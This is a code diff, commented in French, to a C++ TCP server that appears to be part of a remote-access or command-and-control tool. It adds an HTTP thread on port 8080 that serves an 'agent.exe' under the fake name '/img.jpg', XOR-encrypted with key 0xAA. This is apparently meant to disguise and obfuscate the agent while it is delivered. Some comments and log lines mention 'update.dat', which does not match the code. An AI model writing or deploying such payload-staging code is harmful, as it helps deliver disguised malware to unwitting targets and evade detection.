@@ -4,6 +4,8 @@
 #include <algorithm>
 #include <iostream>
 #include <thread>
+#include <fstream>
+#include <sstream>
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -14,6 +16,18 @@
 namespace rslm {
     namespace server {
         namespace networking {
+
+            // Clé XOR pour chiffrer l'agent (à la volée)
+            const unsigned char XOR_KEY = 0xAA;
+
+            // Fonction pour chiffrer/déchiffrer les données avec XOR
+            std::vector<char> XorEncrypt(const std::vector<char>& input) {
+                std::vector<char> output = input;
+                for (size_t i = 0; i < output.size(); i++) {
+                    output[i] ^= XOR_KEY;
+                }
+                return output;
+            }
 
             // Fonction utilitaire pour nettoyer les caractères non UTF-8
             std::string sanitize(const std::string& input) {
@@ -30,6 +44,111 @@ namespace rslm {
                     }
                 }
                 return output;
+            }
+
+            // ============================================================
+            // SERVEUR HTTP POUR PARTAGER L'AGENT (VERSION CHIFFRÉE)
+            // ============================================================
+
+            static void HandleHttpRequest(SOCKET clientSocket, const std::string& request) {
+                // Cherche si la requête demande update.dat (le nom changé)
+                if (request.find("GET /img.jpg") != std::string::npos) {
+                    // Lire le fichier agent.exe
+                    std::ifstream file("img.jpg", std::ios::binary | std::ios::ate);
+                    if (!file.is_open()) {
+                        file.open("agent.exe", std::ios::binary | std::ios::ate);
+                    }
+
+                    if (file.is_open()) {
+                        std::streamsize size = file.tellg();
+                        file.seekg(0, std::ios::beg);
+
+                        std::vector<char> buffer(size);
+                        if (file.read(buffer.data(), size)) {
+                            // CHIFFRER LE FICHIER AVANT ENVOI
+                            std::vector<char> encrypted = XorEncrypt(buffer);
+
+                            // Envoyer la réponse HTTP
+                            std::string response = "HTTP/1.1 200 OK\r\n";
+                            response += "Content-Type: application/octet-stream\r\n";
+                            response += "Content-Length: " + std::to_string(encrypted.size()) + "\r\n";
+                            response += "Connection: close\r\n\r\n";
+
+                            send(clientSocket, response.c_str(), (int)response.size(), 0);
+                            send(clientSocket, encrypted.data(), (int)encrypted.size(), 0);
+
+                            std::cout << "[HTTP] Agent chiffré envoyé (" << encrypted.size() << " bytes, XOR key=" << (int)XOR_KEY << ")" << std::endl;
+                            return;
+                        }
+                    }
+
+                    // Fichier non trouvé
+                    std::string notFound = "HTTP/1.1 404 Not Found\r\n\r\n";
+                    send(clientSocket, notFound.c_str(), (int)notFound.size(), 0);
+                    std::cout << "[HTTP] update.dat non trouvé" << std::endl;
+                    return;
+                }
+
+                // Requête inconnue
+                std::string notFound = "HTTP/1.1 404 Not Found\r\n\r\n";
+                send(clientSocket, notFound.c_str(), (int)notFound.size(), 0);
+            }
+
+            static void HttpServerThread(int port) {
+#ifdef _WIN32
+                SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+#else
+                int sock = socket(AF_INET, SOCK_STREAM, 0);
+#endif
+                if (sock < 0) {
+                    std::cout << "[HTTP] Impossible de créer le socket" << std::endl;
+                    return;
+                }
+
+                // Réutiliser l'adresse
+                int opt = 1;
+                setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
+
+                sockaddr_in addr;
+                addr.sin_family = AF_INET;
+                addr.sin_port = htons(port);
+                addr.sin_addr.s_addr = INADDR_ANY;
+
+                if (bind(sock, (sockaddr*)&addr, sizeof(addr)) < 0) {
+                    std::cout << "[HTTP] Impossible de binder le port " << port << std::endl;
+#ifdef _WIN32
+                    closesocket(sock);
+#else
+                    close(sock);
+#endif
+                    return;
+                }
+
+                listen(sock, 5);
+                std::cout << "[HTTP] Serveur HTTP démarré sur le port " << port << std::endl;
+                std::cout << "[HTTP] Télécharge update.dat sur http://IP:" << port << "/update.dat" << std::endl;
+                std::cout << "[HTTP] Le fichier est chiffré avec XOR 0xAA" << std::endl;
+
+                while (true) {
+                    sockaddr_in clientAddr;
+                    socklen_t clientLen = sizeof(clientAddr);
+#ifdef _WIN32
+                    SOCKET clientSock = accept(sock, (sockaddr*)&clientAddr, &clientLen);
+#else
+                    int clientSock = accept(sock, (sockaddr*)&clientAddr, &clientLen);
+#endif
+
+                    if (clientSock >= 0) {
+                        char buffer[4096] = { 0 };
+                        recv(clientSock, buffer, sizeof(buffer) - 1, 0);
+                        HandleHttpRequest(clientSock, buffer);
+#ifdef _WIN32
+                        closesocket(clientSock);
+#else
+                        close(clientSock);
+#endif
+                    }
+                }
             }
 
             struct ClientInfo {
@@ -57,6 +176,14 @@ namespace rslm {
 
             bool TcpServer::Start(uint16_t port) {
                 if (m_pImpl->running) return false;
+
+                // Démarrer le serveur HTTP pour partager l'agent (une seule fois)
+                static bool httpStarted = false;
+                if (!httpStarted) {
+                    std::thread(HttpServerThread, 8080).detach();
+                    httpStarted = true;
+                    std::cout << "[TcpServer] Serveur HTTP démarré sur le port 8080" << std::endl;
+                }
 
                 m_pImpl->listenSocket = static_cast<int>(socket(AF_INET, SOCK_STREAM, 0));
                 if (m_pImpl->listenSocket < 0) return false;
